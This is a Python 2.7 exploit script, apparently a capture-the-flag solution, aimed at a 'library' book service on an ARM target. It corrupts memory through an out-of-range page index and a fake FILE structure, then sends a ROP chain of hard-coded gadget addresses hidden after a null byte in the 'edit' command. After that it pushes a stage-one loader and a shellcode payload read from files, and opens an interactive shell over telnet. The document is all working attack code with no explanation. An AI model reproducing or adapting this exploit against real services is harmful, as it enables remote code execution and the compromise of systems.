#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib

if len(sys.argv) == 3:
    ADDR = sys.argv[1]
    PORT = int(sys.argv[2])
else:
    ADDR = "localhost"
    PORT = 8888

DBG = True

s = socket.create_connection((ADDR, PORT))

def p64(a):
    return struct.pack("<Q", a)

def u64(s):
    return struct.unpack("<Q", s)[0]

def p32(a):
    return struct.pack("<I", a)

def u32(s):
    return struct.unpack("<I", s)[0]

def rtil(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DBG:
        sys.stdout.write(buf)
        sys.stdout.flush()
    return buf

def add_book(title, pages):
    s.send("add\n")
    rtil(": ")
    s.send(title + "\n")
    rtil(": ")
    s.send(str(len(pages)) + "\n")
    for p in pages:
        rtil(": ")
        s.send(p[0] + "\n")
        rtil(": ")
        s.send(p[1] + "\n")

def edit_book(bidx, pidx, font, content, ropchain=""):
    # we embed the rop chain with the command
    s.send("edit\x00" + ropchain + "\n")
    rtil(": ")
    s.send(str(bidx) + "\n")
    s.send("p\n")
    rtil(": ")
    s.send(str(pidx) + "\n")
    rtil(": ")
    s.send(str(font) + "\n")
    rtil(": ")
    s.send(str(content) + "\n")
    return

rtil("$ ")
s.send("library\n")
pages = []
pages.append(("Sans", "P" * 1020))

# rop stuff
offset = -(0x6400010 - 0x440F820) / 4       # offset to stdout

ggt = 0x44001d8                             # add sp 0x80, pop r4, r5, r6, pc
iread_until = 0x4400108
pr0 = 0x440f2a8                             # pop {r0, lr}; bx lr
bxlr = pr0 + 4
pr45 = 0x440eb74                            # pop {r4, r5, lr}; bx lr
movr15 = 0x440eb70                          # mov r1, r5; pop {r4, r5, lr}; bx lr
bxr4 = 0x440e67c                            # bx r4
popr456pc = 0x44009bc                       # pop {r4, r5, r6, pc}

add_book("bookie", pages)
rtil("$ ")
patt = "A" * 24
patt += p32(120 << 20)                      # read/writeable address with 0, for fake FILE
patt += "A" * 8
patt += p32(ggt)                            # eip

stage1 = open("stage1.bin", "r").read()     # stage1, loader for userland payload
ropchain = "A" * 39
ropchain += p32(pr0) + p32(bxr4)            # overwrite some code, this is the code that has the bxr4
ropchain += p32(pr45) + p32(0x44444444) + p32(len(stage1) + 2)
ropchain += p32(movr15) + p32(iread_until) + p32(0x45454545) 
ropchain += p32(bxr4) + p32(0x45454544) + p32(0x45454546) + p32(0x45454548)  + p32(bxlr)

assert(len(ropchain) < 120)

edit_book(0, offset, patt, "A\x00" + "A" * 1020, ropchain)
s.send("\n")
s.send(stage1 + "\n")

sc = open("sc.bin", "r").read()             # userland payload
assert(len(sc) < 0x22000)

s.send(sc.ljust(0x22000, "\x00"))           # pad with zeroes, the stuff after the code is .bss 
                                            # and newlib expects it all to be 0
                                            # otherwise malloc and what just poops

t = telnetlib.Telnet()
t.sock = s
t.interact()
